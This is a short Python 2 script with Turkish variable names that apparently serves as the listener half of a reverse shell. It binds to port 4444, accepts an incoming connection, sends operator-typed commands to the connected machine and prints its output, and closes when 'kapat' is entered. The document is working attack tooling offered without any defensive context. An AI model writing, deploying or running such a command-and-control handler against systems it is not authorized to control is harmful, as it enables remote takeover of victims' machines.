import socket
import sys
print ("""
############################
# Coder: Cüneyt TANRISEVER #
############################
""")
def socketolustur():
    try:
        global ipadrs
        global portno
        global bag
        ipadrs=''
        portno=4444
        bag=socket.socket()
    except socket.error as hata:
        print "Baglanti hatasi  :"+ str(hata)
def dinleyici():
    try:
        global ipadrs
        global portno
        global bag
        print "Baglanti icin %s portu dinleniyor"%(portno)
        bag.bind((ipadrs,portno))
        bag.listen(5)
    except socket.error as hata:
        print "Baglanti hatasi %s \nTekrar deneniyor :"+ str(hata)
        dinleyici()
def gelenbaglanti():
    gelenbag,adress= bag.accept()
    print "baglanti gerceklesti baglanan ip %s ve portu %s "%(str(adress[0]),str(adress[1]))
    komutyolla(gelenbag)
    gelenbag.close()
def komutyolla(gelenbag):
    while True:
        komut=raw_input("")
        if komut=="kapat":
            gelenbag.close()
            bag.close()
            sys.exit()
        if len(str.encode(komut)) > 0:
            gelenbag.send(str.encode(komut))
            gelenveri = str(gelenbag.recv(1024).encode("utf-8"))
            print gelenveri,


def calistir():
    socketolustur()
    dinleyici()
    gelenbaglanti()

calistir()